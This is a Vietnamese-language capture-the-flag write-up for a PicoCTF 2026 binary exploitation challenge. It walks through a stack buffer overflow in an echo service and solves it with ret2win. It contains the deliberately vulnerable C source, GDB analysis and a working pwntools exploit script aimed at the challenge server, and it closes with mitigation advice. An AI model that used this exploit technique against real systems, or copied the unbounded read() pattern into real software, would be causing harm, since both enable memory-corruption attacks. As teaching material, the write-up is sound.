# PicoCTF 2026: Offset-Cycle

**Category:** Binary Exploitation  |
**Point:** 300 |

> The "secure" echo service welcomes you politely… but what if you don’t stay polite? Can you make it reveal the hidden flag?
> 
```bash
nc mysterious-sea.picoctf.net <port>
```
Bạn cần truy cập vào thử thách trên pico để mở instance

## Tóm tắt
Thử thách được tạo ra với một file binary, code C cùng một server yêu cầu nhập input. Lỗ hổng Buffer Overflow dùng hàm ```read()``` đọc số lượng đầu vào lớn hơn buffer + Không Canaries vì vậy dùng kĩ thuật ret2win để khai thác ra flag

Writeup này được viết bởi chillfish

## 1. Static Reversing
### Chạy thử

Khi kết nối vào server, nó yêu cầu nhập tên, nếu nhập số quá lớn sẽ đơ, còn không thì báo lại tên vừa nhập
```bash
Welcome to the secure echo service!
Please enter your name: 999999999999999999999999999999999999999999999999999999

Welcome to the secure echo service!
Please enter your name: 99999999999999
Hello, 999999999999999
�]��
Thank you for using our service.
```
### Hiểu code C

<details>
<summary>Bấm vào để xem full code</summary>

```C
#include <stdio.h>
#include <unistd.h>
#include <string.h>

void win() {
    FILE *fp = fopen("flag.txt", "rb");
    if (!fp) {
        perror("[!] Failed to open flag.txt");
        return;
    }

    char buffer[128];
    size_t n = fread(buffer, 1, sizeof(buffer), fp);
    fwrite(buffer, 1, n, stdout);
    fflush(stdout);
    printf("\n");
    fclose(fp);
}

int main() {
    char buf[32];

    printf("Welcome to the secure echo service!\n");
    printf("Please enter your name: ");
    fflush(stdout);

    read(0, buf, 128);

    printf("Hello, %s\n", buf);
    printf("Thank you for using our service.\n");

    return 0;
}
```
</details>

Bỏ qua những lệnh gọi thư viện, ta đến với function ```win()```,  nó mở ra đọc flag, nếu flag NULL (không tồn tại, không có quyền) sẽ in lỗi. Tiếp đến, đặt buffer 128bytes, dùng lệnh read đưa flag vào buffer rồi fwrite n byte dữ liệu từ buffer ra stdout (Dùng n trung gian để tối ưu hệ thống). Cuối cùng dùng lệnh ```fflush(stdout)``` để đẩy hết đầu ra ngay lập tức mà không cần chờ chương trình chạy xong mới hiện (Khi BOF chương trình có thể terminated và lỗi toàn bộ khiến flag sẽ không được hiện ra)
```C
void win() {
    FILE *fp = fopen("flag.txt", "rb");
    if (!fp) {
        perror("[!] Failed to open flag.txt");
        return;
    }

    char buffer[128];
    size_t n = fread(buffer, 1, sizeof(buffer), fp);
    fwrite(buffer, 1, n, stdout);
    fflush(stdout);
    printf("\n");
    fclose(fp);
}
```
Và phần thực thi chính của chương trình, tạo buffer 32, đẩy hết đầu ra bằng fflush, dùng lệnh read đọc vào buffer với số lượng tới 128 byte và end ngắt chương trình
```C
int main() {
    char buf[32];

    printf("Welcome to the secure echo service!\n");
    printf("Please enter your name: ");
    fflush(stdout);

    read(0, buf, 128);

    printf("Hello, %s\n", buf);
    printf("Thank you for using our service.\n");

    return 0;
}
```
### Check bảo mật
Ta dùng lệnh ```checksec vuln``` để xem cơ chế bảo mật của bài này
```bash
[*] '/home/flrsh/workspace5/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found     -> No Canaries -> BOF
    NX:         NX enabled
    PIE:        No PIE (0x400000)   -> No PIE -> không random address
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Như code đã phân tích ở trên rằng bài này không có Custom Canary, thêm vào đó địa chỉ process không thay đổi mỗi phiên chạy (No PIE) ta có thể kết luận rằng kĩ thuật khai thác là ret2win

## 2. Dynamic Debugging
Sử dụng công cụ GDB, bằng lệnh gdb vuln để phân tích luồng thực thi bên trong code
### p win
Vì đã biết kĩ thuật khai thác, ta cần tìm được địa chỉ hàm win trước, sử dụng gdb để debug file thực thi chính, sau đó dùng lệnh p win để show ra địa chỉ hàm ```win()``` và nhận lại kết quả là địa chỉ **0x401256**
```bash
gef➤  p win
$1 = {<text variable, no debug info>} 0x401256 <win>
```
### Nhập input
Dùng lệnh ```disas main``` để xem code asm:
```bash
Dump of assembler code for function main:
   0x00000000004012fb <+0>:     endbr64
   0x00000000004012ff <+4>:     push   rbp
   0x0000000000401300 <+5>:     mov    rbp,rsp
   0x0000000000401303 <+8>:     sub    rsp,0x20
   0x0000000000401307 <+12>:    lea    rdi,[rip+0xd22]        # 0x402030
   0x000000000040130e <+19>:    call   0x4010e0 <puts@plt>
   0x0000000000401313 <+24>:    lea    rdi,[rip+0xd3a]        # 0x402054
   0x000000000040131a <+31>:    mov    eax,0x0
   0x000000000040131f <+36>:    call   0x401110 <printf@plt>
   0x0000000000401324 <+41>:    mov    rax,QWORD PTR [rip+0x2d4d]        # 0x404078 <stdout@@GLIBC_2.2.5>
   0x000000000040132b <+48>:    mov    rdi,rax
   0x000000000040132e <+51>:    call   0x401130 <fflush@plt>
   0x0000000000401333 <+56>:    lea    rax,[rbp-0x20]
   0x0000000000401337 <+60>:    mov    edx,0x80
   0x000000000040133c <+65>:    mov    rsi,rax
   0x000000000040133f <+68>:    mov    edi,0x0
   0x0000000000401344 <+73>:    call   0x401120 <read@plt>
   0x0000000000401349 <+78>:    lea    rax,[rbp-0x20]
   0x000000000040134d <+82>:    mov    rsi,rax
   0x0000000000401350 <+85>:    lea    rdi,[rip+0xd16]        # 0x40206d
   0x0000000000401357 <+92>:    mov    eax,0x0
   0x000000000040135c <+97>:    call   0x401110 <printf@plt>
   0x0000000000401361 <+102>:   lea    rdi,[rip+0xd10]        # 0x402078
   0x0000000000401368 <+109>:   call   0x4010e0 <puts@plt>
   0x000000000040136d <+114>:   mov    eax,0x0
   0x0000000000401372 <+119>:   leave
   0x0000000000401373 <+120>:   ret
End of assembler dump.
```
Đặt breakpoint tại lệnh read (b *0x0000000000401344) rồi dùng r và nhập một payload khoảng 60 byte (dùng pwn cyclic 60)

Địa chỉ ngay bên dưới $rbp (hay gọi là saved rbp) chính là return address (rbp+8 là 0x0028 vì đây là kiến trúc 64 bit), bị ghi đề bởi giá trị thử nghiệm ở trên
```bash
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd9c0│+0x0000: "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"    ← $rsp, $rsi
0x00007fffffffd9c8│+0x0008: "caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoa[...]"
0x00007fffffffd9d0│+0x0010: 0x6161616661616165
0x00007fffffffd9d8│+0x0018: 0x6161616861616167
0x00007fffffffd9e0│+0x0020: 0x6161616a61616169   ← $rbp
0x00007fffffffd9e8│+0x0028: 0x6161616c6161616b
0x00007fffffffd9f0│+0x0030: 0x6161616e6161616d
0x00007fffffffd9f8│+0x0038: 0x00007f0a6161616f
```
Bạn thấy giá trị nó tràn xuống bên dưới chứ, đó là tràn bộ nhớ, các giá trị sẽ tràn xuống và chiếm dụng tài nguyên các phần bộ nhớ khác, từ đó ta có thể thay thế giá trị của return address để nó trỏ đến địa chỉ mà mình muốn, ở đây ta trỏ tới hàm win()

## 3. Chiến thuật khai thác
Như đã biết trong code C rằng bài này tạo buffer 32 byte rồi read giá trị nhập vào quá lớn so với buffer, nên ta sẽ dùng payload script để ghi đè return address bằng địa chỉ hàm win
Offset chính xác là 32bytes của BUFFER + 8bytes Saved RBP + địa chỉ hàm win
### Payload
Sử dụng python để viết script cho nhanh gọn

```python
from pwn import *

host = 'mysterious-sea.picoctf.net'
port = #port từ đề bài

p = remote(host, port)

win = p64(0x401256)
payload = b'a'*32 + b'b'*8 + win

p.sendline(payload)

p.interactive()
```

### Kết quả
```bash
flrsh@NguyenDucDuyHung-HE212194-CTVBCM:~/workspace5$ python3 k.py
[+] Opening connection to mysterious-sea.picoctf.net on port 59995: Done
[*] Switching to interactive mode
Welcome to the secure echo service!
Please enter your name: Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbV\x12@
Thank you for using our service.
picoCTF{}[*] Got EOF while reading in interactive
```
Tự làm đi nhé baby

## 4. Kết Luận
Lỗ hổng: Sử dụng hàm read đọc giới hạn đầu vào lớn hơn Buffer size

Hậu quả: Bị ghi đè return address dễ dàng

Biện pháp khắc phục:
* Luôn sử dụng sizeof(buf) làm giới hạn cho hàm read
* Bật Stack Canaries để ngăn chặn việc ghi đè trái phép và PIE để làm ngẫu nhiên địa chỉ các hàm, khiến việc tấn công ret2win trở nên khó khăn hơn [Cách bật/tắt ở đây](https://stackoverflow.com/questions/66976137/how-to-enable-disable-canary)
